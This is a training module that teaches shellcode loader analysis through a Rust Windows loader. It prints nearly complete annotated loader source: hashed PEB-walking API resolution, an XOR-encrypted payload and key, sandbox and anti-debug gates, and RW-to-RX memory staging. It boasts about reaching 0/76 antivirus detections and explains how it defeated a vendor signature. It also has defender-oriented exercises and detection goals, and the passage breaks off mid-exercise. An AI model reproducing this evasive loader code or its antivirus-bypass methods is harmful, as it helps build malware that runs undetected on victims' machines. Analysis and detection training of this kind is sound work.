# Stage 01: Basic Loader — Learning Path

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Shellcode Loader Fundamentals |
| **Level** | Beginner → Intermediate |
| **Estimated Time** | 4-5 hours |
| **Category** | Malware Analysis / Reversing |
| **Platform** | Windows x64 |
| **Binary** | `basic-loader.exe` (~294KB, Rust, PE64) |
| **VT Score** | **0/76 → 1/76** (achieved 0/76 on 2026-03-12, decayed to 1/76 by 2026-03-17 due to sample burning) |

### VT Detection Journey

```
 ██████████████████████████████████████ 0/76  ← ACHIEVED (March 12, 2026)
 █████████████████████████████████████░ 1/76  ← CURRENT  (March 17, 2026)
                                               ESET Agent.ION (sample-burned)

 This binary passed ALL 76 AV engines. The single detection that appeared 5 days
 later is a codebase-specific signature trained on previous VT submissions —
 NOT a detection of the technique itself. See Section 4B for the full forensic story.
```

---

## Why This Stage Exists

This is where everything begins. Every malware family — from commodity RATs to nation-state implants — needs a loader. The loader is the bridge between "encrypted blob on disk" and "running code in memory." Without understanding loaders, you cannot understand anything that follows.

**The core problem loaders solve**: Windows enforces Data Execution Prevention (DEP) — data regions can't execute code. A loader creates the transition: encrypted data → decrypted data → executable memory → running thread. Every technique in Stages 02-15 is a refinement of this fundamental pipeline.

**What defenders should know**: If you can detect the loader, you detect the attack before any damage occurs. The shellcode never runs. This is why loader detection is the highest-value detection investment — it's the choke point.

**What attackers know**: The loader is the most scrutinized component. It's what AV scans, what sandboxes execute, what analysts reverse engineer first. Making the loader invisible is the prerequisite for everything else.

### The Arms Race Starts Here

```
This stage (Stage 01):
  You build a basic loader → it works → AV sees the XOR key in .rdata

Stage 02 fixes this:
  You encrypt the payload → AV can't signature-match → but IAT still shows VirtualAlloc

Stage 04 fixes that:
  You hash API names → IAT is clean → but debuggers trace the API calls

Stage 07 fixes that:
  You use syscalls → ntdll hooks bypassed → but the syscall instruction is a signature

Stage 09 fixes that:
  You add anti-debug → analysts can't step through → but sandboxes still detonate

Stage 10 fixes that:
  You add sandbox detection → automated analysis fails → but memory scanners catch you

Stage 12-13 fix that:
  You stomp modules + encrypt during sleep → memory is clean 95% of the time

Stage 14 combines everything.
Stage 15 adds network communication.

Every stage exists because a defender broke the previous one.
```

### Real-World Context (2025-2026)

This isn't academic. The exact techniques in this stage are used in production malware right now:

- **Cobalt Strike 4.11** (May 2025) — The world's most widely used C2 framework uses the same VirtualAlloc → VirtualProtect → CreateThread pipeline in its beacon loader
- **VENON Banking Trojan** (March 2026) — A Rust-based banking trojan targeting 33 Brazilian banks uses XOR-encrypted payloads with runtime decryption, likely AI-assisted code generation
- **MuddyWater's RustyWater** (2025) — Iranian state-sponsored APT migrated from PowerShell to Rust implants, using PEB-walking API resolution identical to what you'll analyze here
- **Malicious VS Code Extensions** (November 2025) — Supply chain attack delivered Rust implants via VS Code marketplace, using the same loader pattern

Microsoft responded by releasing **RIFT** (June 2025) — a tool specifically designed to analyze Rust malware binaries by separating attacker code from Rust standard library noise. A C++ downloader has ~100 functions; the Rust equivalent has ~10,000. RIFT uses FLIRT signatures and binary diffing to isolate the attacker's code. Understanding what RIFT sees (and what it misses) is essential for both offense and defense.

**Further reading**:
- [Microsoft RIFT: Rust Malware Analysis](https://www.microsoft.com/en-us/security/blog/2025/06/27/unveiling-rift-enhancing-rust-malware-analysis-through-pattern-matching/)
- [Hackmosphere: Bypassing Windows Defender in 2025 (Part 1-2)](https://www.hackmosphere.fr/en/bypassing-windows-defender-antivirus-in-2025-evasion-techniques-using-direct-syscalls-and-xor-encryption-part-1/)
- [Bishop Fox: Rust for Malware Development](https://bishopfox.com/blog/rust-for-malware-development)

---

## Prerequisites

Before starting this module, you should be comfortable with:
- Basic x86-64 assembly (registers, common instructions like `mov`, `push`, `call`, `jmp`)
- PE file format basics (sections, headers, imports)
- Using a hex editor (HxD, 010 Editor, or similar)
- Basic Python scripting
- Having used a debugger at least once (x64dbg, WinDbg, or GDB)

**Software needed**:
- Ghidra 11.x (free) or IDA Free/Pro
- x64dbg + ScyllaHide plugin
- Python 3.10+
- PE-bear or CFF Explorer
- A Windows 10/11 x64 VM (recommended: FlareVM or Commando VM)

---

## Learning Objectives

By the end of this module, you will be able to:

1. **Explain** why modern malware uses dynamic API resolution instead of static imports, and what problem it solves
2. **Trace** the PEB-walking chain: TEB → PEB → Ldr → InLoadOrderModuleList → PE export table
3. **Recognize** the additive hash algorithm (seed `0x1F2E3D4C`, wrapping_mul `0x1003F`) in compiled x86-64 code and build a rainbow table to identify hashed API names
4. **Understand** the shellcode staging pipeline: VirtualAlloc → Write → VirtualProtect → Execute, and why each step is necessary for DEP bypass
5. **Differentiate** between RWX (suspicious) and RW→RX (stealthier) memory permission transitions
6. **Identify** the multi-byte XOR cipher by its structural characteristics (repeating key cycle, no S-box, no rounds) in compiled code
7. **Extract** encrypted payloads from PE binaries and decrypt them using a custom Python script
8. **Write** basic YARA and Sigma detection rules targeting the techniques observed
9. **Articulate** the detection gaps — what logging/telemetry is needed to catch this behavior

---

## Section 1: Theory — Why Loaders Exist

**Time**: 30 minutes | **Type**: Reading + Diagrams

### 1.1 The Problem: Data Execution Prevention (DEP)

Modern Windows enforces Data Execution Prevention (DEP) — memory regions are either writable OR executable, never both simultaneously (by default). This means:

- You can't put shellcode on the stack and jump to it (stack is `RW`, not `RWX`)
- You can't put shellcode in a global variable and call it (`.data` is `RW`, not `RWX`)
- You can't just `memcpy` shellcode anywhere and expect it to run

**The loader's job**: Allocate a special memory region with execute permissions, place the shellcode there, and transfer control to it.

### 1.2 The Shellcode Staging Pipeline

Every shellcode loader — from the simplest to the most advanced — follows this fundamental pattern:

```
┌─────────────────────────────────────────────────────────────────┐
│                    THE LOADER PIPELINE                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────────────┐                                       │
│  │  Encrypted Payload   │  Stored in .rdata / .data / resource  │
│  │  (byte array const)  │  Entropy ~7.5-8.0 bits/byte           │
│  └──────────┬───────────┘                                       │
│             │                                                   │
│             ▼ Decrypt (XOR / AES / RC4 / custom)                │
│  ┌──────────────────────┐                                       │
│  │  Plaintext Shellcode │  Sitting in a heap buffer             │
│  │  (Vec<u8> / malloc)  │  NOT yet executable                   │
│  └──────────┬───────────┘                                       │
│             │                                                   │
│             ▼ VirtualAlloc(RW)                                  │
│  ┌──────────────────────┐                                       │
│  │  RW Memory Page      │  OS allocates committed virtual pages │
│  │  (PAGE_READWRITE)    │  Address returned in RAX              │
│  └──────────┬───────────┘                                       │
│             │                                                   │
│             ▼ memcpy / copy_nonoverlapping                      │
│  ┌──────────────────────┐                                       │
│  │  Shellcode in RW Page│  Data is there, but can't execute     │
│  │  (still RW, not RX)  │  DEP would fault on EIP/RIP here      │
│  └──────────┬───────────┘                                       │
│             │                                                   │
│             ▼ VirtualProtect(RX)                                │
│  ┌──────────────────────┐                                       │
│  │  Shellcode in RX Page│  Now executable! Write removed.       │
│  │  (PAGE_EXECUTE_READ) │  This is the critical transition      │
│  └──────────┬───────────┘                                       │
│             │                                                   │
│             ▼ CreateThread(addr) / call addr                    │
│  ┌──────────────────────┐                                       │
│  │  Shellcode Executing │  Running in its own thread            │
│  │  (MessageBox, beacon)│  Loader waits via WaitForSingleObject │
│  └──────────────────────┘                                       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.3 Why RW→RX Instead of RWX?

A simpler approach would be `VirtualAlloc(RWX)` — allocate memory that's readable, writable, AND executable all at once. Why don't modern loaders do this?

| Approach | Memory Flags | AV/EDR Visibility |
|----------|-------------|-------------------|
| Single RWX allocation | `PAGE_EXECUTE_READWRITE (0x40)` | 🔴 Extremely suspicious. Almost no legitimate software allocates RWX. EDR alerts fire immediately |
| Two-step RW→RX | `PAGE_READWRITE (0x04)` → `PAGE_EXECUTE_READ (0x20)` | 🟡 Suspicious but harder to distinguish. JIT compilers (V8, .NET CLR, Java HotSpot) do this legitimately |
| Three-step RW→RX→cleanup | Same as above + free the RW buffer | 🟢 Harder to catch — the writable evidence is gone |

**Key insight**: The RW→RX pattern mimics what JIT compilers do. The .NET CLR, Chrome's V8 engine, and Java all allocate writable memory, generate code into it, then flip it to executable. A loader that follows this pattern blends in with legitimate software behavior.

### 1.4 Why Not Just Write Into the Allocated Page Directly?

> **Discussion question**: Why does the loader decrypt shellcode into a separate heap buffer (`Vec<u8>`) and then `memcpy` it to the VirtualAlloc'd page? Why not decrypt directly into the allocated RW page?

**Answer**: You could decrypt directly into the VirtualAlloc'd page — it's RW at that point, so writes succeed. But separating them has advantages:
1. **Modularity**: The decrypt function returns a `Vec<u8>` without knowing about memory allocation. Different loaders can reuse the same decrypt code
2. **Cleanup**: The heap buffer can be zeroed and freed independently. If something fails between allocation and protection change, you haven't leaked plaintext shellcode in an allocated region
3. **Size verification**: You can check the decrypted size before allocating — avoids allocating too much (suspicious) or too little (crash)

In more advanced loaders (Stage 12: Module Stomping, Stage 13: Sleep Obfuscation), the allocation target isn't even a VirtualAlloc'd page — it's inside a legitimate DLL's memory space.

### 1.5 Why Hide API Calls?

If a binary imports `VirtualAlloc`, `VirtualProtect`, and `CreateThread` from kernel32.dll, any AV can read the import table and flag it as potentially malicious before the binary even runs. This is called **static import analysis**.

**Dynamic API resolution** solves this by:
1. Not importing any offensive functions at compile time (IAT has zero suspicious entries)
2. At runtime, walking the Process Environment Block (PEB) — a Windows structure that lists all loaded DLLs
3. Parsing each DLL's export table to find the function by name (or by hash of the name)
4. Casting the found address to a function pointer and calling it

The result: the import table shows nothing interesting, but the binary can call any Windows API at runtime.

```
┌─────────────────────────────────────────────────────────────────┐
│              PEB-WALKING API RESOLUTION                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  gs:[0x60] ──► PEB                                              │
│                 │                                               │
│                 ├── Ldr (PEB_LDR_DATA*)                         │
│                 │    │                                          │
│                 │    └── InLoadOrderModuleList                  │
│                 │         │                                     │
│                 │         ├── basic-loader.exe (always first)   │
│                 │         ├── ntdll.dll                         │
│                 │         ├── kernel32.dll ◄── find this        │
│                 │         ├── kernelbase.dll                    │
│                 │         └── ... (other loaded DLLs)           │
│                 │                                               │
│  For each DLL:  Hash DLL name (case-insensitive additive hash)  │
│                 Compare hash vs target_dll_hash                 │
│                 If match → parse PE export table:               │
│                                                                 │
│                 ┌─ IMAGE_EXPORT_DIRECTORY ─┐                    │
│                 │  AddressOfNames[]        │ → hash each name   │
│                 │  AddressOfFunctions[]    │ → get RVA          │
│                 │  AddressOfNameOrdinals[] │ → index mapping    │
│                 └──────────────────────────┘                    │
│                                                                 │
│  Result: raw function pointer, same as GetProcAddress returns   │
│          but without importing GetProcAddress                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.6 Why Two Different Hash Algorithms?

This binary contains **two independent API hashing systems** that serve different purposes. Understanding this dual-layer architecture is critical — confusing them is the #1 analyst mistake on this stage.

```
┌───────────────────────────────────────────────────────────────┐
│             DUAL HASHING ARCHITECTURE                         │
├───────────────────────────────────────────────────────────────┤
│                                                               │
│  LAYER 1: The Rust Loader (compile-time code)                 │
│  ─────────────────────────────────────────                    │
│  Algorithm: Additive hash (custom)                            │
│  Seed:      0x1F2E3D4C                                        │
│  Operation: wrapping_add(byte) → wrapping_mul(0x1003F) →      │
│             xor(h >> 11)                                      │
│  Purpose:   Resolve VirtualAlloc, VirtualProtect, CreateThread│
│             from kernel32.dll via PEB walking                 │
│  Location:  Pre-computed hash constants in .rdata             │
│  When:      BEFORE shellcode decryption (the loader needs     │
│             these APIs to set up memory for the shellcode)    │
│                                                               │
│  LAYER 2: The Embedded Shellcode (payload code)               │
│  ─────────────────────────────────────────                    │
│  Algorithm: ROR13 (Metasploit "block_api" style)              │
│  Seed:      0 (implicit)                                      │
│  Operation: ror(hash, 13) + byte (rotate-right 13, then add)  │
│  Purpose:   Resolve LoadLibraryA, MessageBoxA, ExitThread     │
│             from kernel32.dll / user32.dll                    │
│  Location:  Embedded as immediate values in shellcode x86-64  │
│             instructions (e.g., mov r10d, 0x0726774C)         │
│  When:      AFTER the shellcode is decrypted and executing    │
│             in its own thread                                 │
│                                                               │
├───────────────────────────────────────────────────────────────┤
│                                                               │
│  WHY DIFFERENT?                                               │
│                                                               │
│  The loader and shellcode are INDEPENDENT programs:           │
│  - The loader is written in Rust, compiled by rustc           │
│  - The shellcode is hand-crafted x86-64 assembly              │
│  - They were developed by different people/tools              │
│  - The shellcode's ROR13 is a Metasploit convention (1999+)   │
│  - The loader's additive hash is a custom algorithm           │
│                                                               │
│  An analyst who finds the additive hash seed (0x1F2E3D4C) and │
│  builds a rainbow table will resolve the LOADER's APIs.       │
│  But the SHELLCODE's APIs use ROR13 with different hashes.    │
│  A separate rainbow table is needed for each algorithm.       │
│                                                               │
│  This is common in real malware: the dropper/loader uses one  │
│  hashing system, and the payload uses another. Cobalt Strike, │
│  Metasploit, and most commercial C2 frameworks exhibit this   │
│  dual-layer pattern.                                          │
│                                                               │
└───────────────────────────────────────────────────────────────┘
```

> **Discussion question**: Why doesn't the shellcode reuse the loader's additive hash algorithm?
>
> **Answer**: The shellcode must be **position-independent** — it can't rely on any external code. The ROR13 resolver (block_api) is embedded INSIDE the shellcode as a self-contained subroutine (~190 bytes). It resolves APIs from scratch by walking the PEB independently. The loader's hash function exists in the Rust binary's .text section — the shellcode can't call it because it doesn't know where it is (ASLR randomizes addresses). Each component must be fully self-contained.

---

## Section 1B: Source Code Deep Dive — The Complete Loader

**Time**: 30 minutes | **Type**: Annotated code reading

Before touching the binary, read the actual source code. Understanding the implementation at the source level gives you a map for what to look for in the disassembly.

### The Complete `main.rs` — Annotated Line by Line

```rust
#![windows_subsystem = "windows"]
// ^^^ THIS IS CRITICAL. Tells the Rust compiler to link as a Windows GUI application.
// Without it: a console window flashes on screen when the binary runs (suspicious).
// With it: no console window, silent execution. Same as /SUBSYSTEM:WINDOWS linker flag.
// Detection note: pestudio flags "console" subsystem + no visible window as suspicious.

use core::ffi::c_void;
// ^^^ Raw pointer type for Win32 API interop. Rust's equivalent of `void*`.

use windows_sys::Win32::System::SystemInformation::{
    GetSystemInfo, SYSTEM_INFO, GlobalMemoryStatusEx, MEMORYSTATUSEX, GetTickCount64,
};
use windows_sys::Win32::Storage::FileSystem::GetDiskFreeSpaceExW;
use windows_sys::Win32::System::Threading::CreateProcessW;
// ^^^ These are DIRECT IAT IMPORTS from windows-sys crate. They appear in the binary's
// import table as kernel32.dll functions. This is INTENTIONAL:
// 1. GetSystemInfo/GlobalMemoryStatusEx/GetTickCount64/GetDiskFreeSpaceExW are used
//    by sandbox_check() for hardware validation (CPU, RAM, disk, uptime)
// 2. CreateProcessW is imported but never called — it's a black_box() IAT anchor
//    that makes the binary look like a process launcher (benign IAT profile)
//
// KEY INSIGHT: This binary has NO user32.dll imports, NO GUI window lifecycle, and
// NO iat_pad module. It is SELF-CONTAINED — no `common` library dependency at all.
// This architecture killed ESET Agent.ION by eliminating shared offensive code patterns.

// === INLINE PEB WALKER — SELF-CONTAINED API RESOLUTION ===
// Unlike other Goodboy stages that use common::evasion::apihash, this binary
// implements its OWN PEB walker with a DIFFERENT hash algorithm (additive hash,
// NOT rotate-XOR). This means code patterns from this binary don't match the
// common library's signatures — each binary is forensically independent.

#[repr(C)]
struct ListEntry { flink: *mut ListEntry, _blink: *mut ListEntry }
// ... (PEB data structures for InLoadOrderModuleList traversal)

unsafe fn get_peb() -> *const Peb {
    let peb: *const Peb;
    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, nomem));
    peb
}

// Additive hash — completely different bytecode from rotate-XOR
fn additive_hash(name: &[u8]) -> u32 {
    let mut h: u32 = 0x1F2E3D4C;
    for &b in name {
        h = h.wrapping_add(b as u32);
        h = h.wrapping_mul(0x1003F);
        h ^= h >> 11;
    }
    h
}
// ^^^ This is NOT djb2 (multiply-by-33, seed 5381) and NOT rotate-XOR.
// It's an additive hash: seed 0x1F2E3D4C, wrapping_add(byte), wrapping_mul(0x1003F),
// then XOR with h>>11 for avalanche. The case-insensitive variant (additive_hash_ci)
// lowercases each byte before hashing — used for DLL name matching.

// Pre-computed hashes for needed APIs (computed at compile time via const fn)
const H_KERNEL32: u32 = additive_hash_ci_const(b"kernel32.dll");
const H_VIRTUALALLOC: u32 = additive_hash_const(b"VirtualAlloc");
const H_VIRTUALPROTECT: u32 = additive_hash_const(b"VirtualProtect");
const H_CREATETHREAD: u32 = additive_hash_const(b"CreateThread");
const H_WAITFORSINGLEOBJECT: u32 = additive_hash_const(b"WaitForSingleObject");
const H_CLOSEHANDLE: u32 = additive_hash_const(b"CloseHandle");
// ^^^ The hash constants exist ONLY as pre-computed 32-bit values in .rdata.
// The additive_hash_const() function runs at COMPILE TIME — the algorithm itself
// never appears in the binary's executable code for the const-evaluated paths.
// However, the runtime resolve_api() function does contain the algorithm inline
// for matching against loaded module names.

unsafe fn resolve_api(dll_hash: u32, fn_hash: u32) -> Option<*const ()> {
    // Walks InLoadOrderModuleList (NOT InMemoryOrder like other Goodboy stages)
    // For each DLL: hash base_name with additive_hash_ci, compare to dll_hash
    // If match: parse PE export table, hash each export name, compare to fn_hash
    // Returns: raw function pointer to the matched export
}

// === TYPE ALIASES FOR RESOLVED API FUNCTIONS ===
type VAllocFn = unsafe extern "system" fn(*const c_void, usize, u32, u32) -> *mut c_void;
type VProtFn = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
type CrtThFn = unsafe extern "system" fn(
    *const c_void, usize, *const c_void, *const c_void, u32, *mut u32
) -> *mut c_void;
type WaitFn = unsafe extern "system" fn(*mut c_void, u32) -> u32;
type ClosFn = unsafe extern "system" fn(*mut c_void) -> i32;
// ^^^ These function pointer types match the Win32 API signatures EXACTLY.
// They're used with core::mem::transmute() to cast the raw pointers returned
// by resolve_api() into callable function pointers.
//
// NONE of these appear in the import table. They're resolved at runtime via PEB walking.
// This is the core of API hashing — offensive APIs exist only as function pointers
// in stack variables, never as PE import entries.

// === ENCRYPTED PAYLOAD ===
const XOR_KEY: &[u8] = &[
    0x37, 0x4a, 0x8b, 0xc1, 0xde, 0xf0, 0x23, 0x67,
    0x89, 0xab, 0xcd, 0xef, 0x01, 0x23, 0x45, 0x67,
];
// ^^^ 16-byte XOR key stored in .rdata section. Visible to anyone who reads the binary.
// This is the weakest link — a reverse engineer who finds this key can decrypt the
// payload in seconds. Stages 02-03 don't change this fundamentally; they just use
// stronger algorithms. The real protection isn't the crypto — it's preventing automated
// signature matching on the encrypted blob.

const ENCRYPTED_SHELLCODE: &[u8] = &[
    0xde, 0xf4, 0x8b, 0xc1, /* ... 302 bytes total ... */
];
// ^^^ 302-byte MessageBox("GoodBoy","OK") shellcode, XOR-encrypted with the key above.
// Stored in .rdata as a constant byte array. In Ghidra, this appears as a high-entropy
// blob (~7.5-7.9 bits/byte). The proximity to XOR_KEY in .rdata is itself a detection
// signal — key material adjacent to encrypted data is a common malware pattern.

// === BENIGN GATES ===

fn verify_env() -> bool {
    let sr = std::env::var("SystemRoot").unwrap_or_default();
    let up = std::env::var("USERPROFILE").unwrap_or_default();
    // ... (reads 5 env vars, validates paths with BTreeMap)
    core::hint::black_box(ok >= 3)
}
// ^^^ Environment validation gate. Reads SystemRoot, USERPROFILE, LOCALAPPDATA,
// ProgramData, windir. Validates that expected paths exist. Uses BTreeMap to
// store results — this pulls in ~30KB of legitimate Rust stdlib code, shifting
// the binary's byte distribution toward "normal Rust application."
//
// EVASION LESSON: This benign code dilution killed ESET-NOD32 and DeepInstinct
// in Round 11 of VT testing (detections dropped from 12 to 0 across those engines).

fn preflight() -> bool {
    let pc = std::env::var("NUMBER_OF_PROCESSORS").unwrap_or_default();
    // ... (reads 5 more env vars, validates with HashMap)
    core::hint::black_box(passing >= 3)
}
// ^^^ Second benign gate. Reads NUMBER_OF_PROCESSORS, APPDATA, TEMP, COMPUTERNAME,
// OS. Validates CPU count, checks APPDATA\Microsoft\Windows directory exists.
// Uses HashMap for results — more stdlib code mass.
//
// NOTE: This is an INLINE function, NOT common::benign::preflight(). The binary
// has no dependency on the common library whatsoever.

unsafe fn sandbox_check() -> bool {
    // Hardware-based sandbox detection:
    // 1. GetSystemInfo → CPU count < 2 = sandbox
    // 2. GlobalMemoryStatusEx → RAM < 4GB = sandbox
    // 3. GetDiskFreeSpaceExW("C:\\") → disk < 60GB = sandbox
    // 4. GetTickCount64 → uptime < 30 min = sandbox
    // Score 3+ = likely sandbox → return true (bail out)
    //
    // CreateProcessW is imported via black_box() as an IAT anchor only.
    // It makes the binary look like a process launcher in static analysis.
}

fn dbg(tag: &str) {
    let _ = std::fs::write(
        std::env::temp_dir().join(format!("goodboy_{}.txt", tag)), tag);
}
// ^^^ Debug breadcrumb function. Writes a small tag file to %TEMP% at each stage.
// Tags: "s" (start), "ok" (gates passed), "gates" (sandbox passed),
// "exec" (shellcode executing), "done" (complete).
// BONUS: std::fs::write pulls in file I/O code from the stdlib, adding more benign
// code mass to the binary.

// === THE MAIN FUNCTION — THE ENTIRE ATTACK CHAIN ===
fn main() {
    dbg("s");

    // GATE 1: Environment validation (inline)
    if !verify_env() { return; }

    // GATE 2: Benign code preflight (inline)
    if !preflight() { return; }
    dbg("ok");

    // GATE 3: KUSER_SHARED_DATA uptime check
    // Reads TickCountQuad from 0x7FFE0320 — a kernel-mapped read-only page.
    // If uptime < 300,000 ticks (~5 min), likely a sandbox that just booted.
    let ok = unsafe { core::ptr::read_volatile(0x7FFE0320usize as *const i64) > 300_000 };
    if !ok { return; }

    unsafe {
        // GATE 4: Inline PEB anti-debug check
        // Reads PEB.BeingDebugged at PEB offset +2 (single byte)
        // If non-zero, a debugger is attached → bail
        let peb = get_peb();
        if !peb.is_null() {
            let being_debugged = *((peb as *const u8).add(2));
            if being_debugged != 0 { return; }
        }

        // GATE 5: Hardware sandbox check (CPU, RAM, disk, uptime)
        if sandbox_check() { return; }
        dbg("gates");

        // === THE OFFENSIVE CORE (6 steps) ===

        // Step 1: Decrypt the shellcode (inline XOR — no common::crypto::xor)
        let mut sc = ENCRYPTED_SHELLCODE.to_vec();
        for i in 0..sc.len() { sc[i] ^= XOR_KEY[i % XOR_KEY.len()]; }
        // Now sc[] contains 302 bytes of plaintext executable code

        // Step 2: Resolve APIs via INLINE PEB walker (additive hash, not rotate-XOR)
        let va: VAllocFn = match resolve_api(H_KERNEL32, H_VIRTUALALLOC) {
            Some(f) => core::mem::transmute(f), None => return };
        // ^^^ Walks PEB → InLoadOrderModuleList → finds kernel32.dll by
        // additive_hash_ci match → searches export table for VirtualAlloc
        // by additive_hash match. Returns raw function pointer.
        // transmute() casts it to VAllocFn type for calling.

        // (Same pattern for VirtualProtect, CreateThread, WaitForSingleObject, CloseHandle)

        // Step 3: Allocate RW memory
        let addr = va(core::ptr::null(), sc.len(), 0x3000, 0x04);
        // 0x3000 = MEM_COMMIT | MEM_RESERVE
        // 0x04 = PAGE_READWRITE
        // Returns a pointer to a new memory page. NOT yet executable.

        // Step 4: Copy shellcode to the allocated page
        core::ptr::copy_nonoverlapping(sc.as_ptr(), addr as *mut u8, sc.len());

        // Step 5: Zero the source buffer (forensic hygiene)
        for b in sc.iter_mut() { *b = 0; }
        // The decrypted shellcode in the heap is now gone.
        // Only copy exists in the VirtualAlloc'd page.

        // Step 6a: Change memory protection to executable
        let mut old: u32 = 0;
        vp(addr, sc.len(), 0x20, &mut old);
        // 0x20 = PAGE_EXECUTE_READ
        // THIS IS THE CRITICAL MOMENT. The page is now executable.
        // A memory scanner running RIGHT NOW would catch plaintext shellcode
        // in a MEM_PRIVATE executable region.
        dbg("exec");

        // Step 6b: Execute the shellcode
        let th = ct(
            core::ptr::null(), 0, addr, core::ptr::null(), 0, core::ptr::null_mut()
        );
        // CreateThread with lpStartAddress = addr (the shellcode)
        // A new thread begins executing at the first shellcode byte

        // Step 6c: Wait for completion and cleanup
        if !th.is_null() {
            wt(th, 0xFFFFFFFF);  // INFINITE wait
            cl(th);              // Release handle
        }
        dbg("done");
    }
}
```

### Why Self-Contained? The Agent.ION Lesson

This binary deliberately avoids the `common` library used by other Goodboy stages. Why?

ESET created the `Win64/Agent.ION` signature by training on VT submissions of multiple Goodboy binaries that all shared `common` library code. The shared code patterns (rotate-XOR hash, PEB walker structure, XOR crypto module) became the signature itself.

By going fully self-contained with a **different hash algorithm** (additive vs. rotate-XOR), **different PEB list** (InLoadOrder vs. InMemoryOrder), and **inline everything**, this binary's code patterns are forensically independent from the other stages. ESET's Agent.ION signature targeting common library patterns doesn't match.

### Architecture Summary

```
┌─────────────────────────────────────────────────────────┐
│                  basic-loader.exe                       │
│                                                         │
│  IAT (visible to static analysis):                      │
│  ├── kernel32.dll: GetSystemInfo, GlobalMemoryStatusEx, │
│  │   GetTickCount64, GetDiskFreeSpaceExW, CreateProcessW│
│  ├── kernel32.dll: Rust stdlib (GetEnvironmentVariableW,│
│  │   GetModuleHandleW, etc.)                            │
│  └── (NO user32.dll, NO iat_pad, NO gdi32/ws2_32/etc.)  │
│                                                         │
│  Runtime-resolved (invisible to static analysis):       │
│  ├── VirtualAlloc      (via inline PEB walker)          │
│  ├── VirtualProtect    (via inline PEB walker)          │
│  ├── CreateThread      (via inline PEB walker)          │
│  ├── WaitForSingleObject (via inline PEB walker)        │
│  └── CloseHandle       (via inline PEB walker)          │
│                                                         │
│  Execution flow:                                        │
│  main() → verify_env → preflight → KUSER_SHARED_DATA    │
│         → PEB anti-debug → sandbox_check                │
│         → XOR_decrypt → VirtualAlloc(RW) → memcpy       │
│         → zero_source → VirtualProtect(RX)              │
│         → CreateThread → WaitForSingleObject → exit     │
└─────────────────────────────────────────────────────────┘
```

---

## Section 2: Hands-On — Static Analysis

**Time**: 60 minutes | **Type**: Guided lab exercises

### Exercise 2.1: Import Table Analysis

**Goal**: Determine that the binary uses dynamic API resolution.

1. Open `basic-loader.exe` in PE-bear (or CFF Explorer / `dumpbin /imports`)
2. Navigate to the Import Directory

**Questions**:
- Q1: How many DLLs are listed in the import table?
  > *Expected answer*: Primarily kernel32.dll (plus Rust stdlib dependencies like ntdll.dll, vcruntime140.dll). The binary does NOT import user32.dll, gdi32.dll, ws2_32.dll, or other "padding" DLLs. It has a minimal IAT — no iat_pad module.

- Q2: Look at the specific functions imported from kernel32.dll. Do you see `VirtualAlloc`, `VirtualProtect`, or `CreateThread`?
  > *Expected answer*: No. The offensive APIs (VirtualAlloc, VirtualProtect, CreateThread) are NOT in the import table. What you'll see are system information functions (`GetSystemInfo`, `GlobalMemoryStatusEx`, `GetTickCount64`, `GetDiskFreeSpaceExW`), an unused IAT anchor (`CreateProcessW`), and Rust stdlib runtime functions like `GetEnvironmentVariableW`, `GetModuleHandleW`.

- Q3: Look at the kernel32 imports. What do `GetSystemInfo`, `GlobalMemoryStatusEx`, `GetDiskFreeSpaceExW`, and `GetTickCount64` have in common?
  > *Expected answer*: They are all **hardware query APIs** — functions that query CPU count, RAM size, disk size, and system uptime. These are used by the inline `sandbox_check()` function to detect low-resource sandbox environments. They also make the binary look like a system information tool. `CreateProcessW` is imported but never called — it's a black_box() IAT anchor for static analysis camouflage.

- Q4: What does this import pattern tell you about how the binary calls `VirtualAlloc` and `CreateThread`?
  > *Expected answer*: Since these functions aren't in the import table but the binary clearly needs them (it must allocate executable memory somehow), it resolves them **dynamically at runtime** — via PEB-walking with an inline additive hash resolver.

**Takeaway**: A binary with hardware query imports but zero memory allocation or threading imports is a strong indicator of dynamic API resolution. The sandbox-check APIs serve double duty: actual sandbox detection AND IAT profile camouflage.

---

### Exercise 2.2: Identifying the Encrypted Payload

**Goal**: Find the encrypted shellcode blob in the binary.

1. Open `basic-loader.exe` in Ghidra
2. After auto-analysis completes, navigate to the `.rdata` section
3. Look for high-entropy data — large byte arrays that look random

**Method A — Visual entropy scan**:
- Go to `Window → Entropy` in Ghidra (or use the Entropy Visualization plugin)
- High-entropy regions (approaching 8.0 bits/byte) appear as bright/hot spots
- `.rdata` should have mostly low-entropy data (string constants, vtables) with one obvious high-entropy region

**Method B — Manual search**:
- Browse `.rdata` in the hex view
- Look for a continuous block of bytes with no obvious patterns (no repeated sequences, no printable ASCII)
- The block is 302 bytes starting with: `DE F4 8B C1 DE B1 72 26 D9 F9 9C B9`

**Questions**:
- Q5: What is the address of the 302-byte blob?
  > *Expected answer*: Address varies by build, but it's in `.rdata`. Record it.

- Q6: What is the approximate entropy of this blob? (Use CyberChef's "Entropy" operation if needed)
  > *Expected answer*: ~7.5-7.9 bits/byte. Near-maximum entropy indicates encryption or compression.

- Q7: Find the 16-byte constant near the blob. What are its bytes?
  > *Expected answer*: `37 4A 8B C1 DE F0 23 67 89 AB CD EF 01 23 45 67`. This is the XOR decryption key.

- Q8: In Ghidra, cross-reference (XREF) both constants. Do they share a common referencing function?
  > *Expected answer*: Yes — both are referenced by the main decrypt function. This confirms the 16-byte constant is the key for the 302-byte blob.

**Takeaway**: High-entropy blobs in `.rdata` are a strong indicator of encrypted payloads. Nearby constants of key-sized lengths (16, 24, 32 bytes) are likely keys.

---

### Exercise 2.3: Recognizing the Hashing Algorithm

**Goal**: Identify the additive hash in compiled x86-64 code and build a rainbow table.

The binary resolves APIs by hashing their names and comparing against pre-computed hash constants. Let's identify the algorithm.

1. In Ghidra, search for the constant `0x1F2E3D4C` (the additive hash seed value)
   - `Search → For Scalars → 0x1F2E3D4C` or `Search → Memory → 4C 3D 2E 1F` (little-endian)

2. Navigate to the function containing this constant. You should see a loop that:
   - Starts with `hash = 0x1F2E3D4C`
   - Adds the current byte to the hash (`wrapping_add`)
   - Multiplies the hash by `0x1003F` (`wrapping_mul`)
   - XORs the hash with itself right-shifted by 11 (`h ^= h >> 11`)

3. In x86-64, the three-step hash operation compiles to:
   ```asm
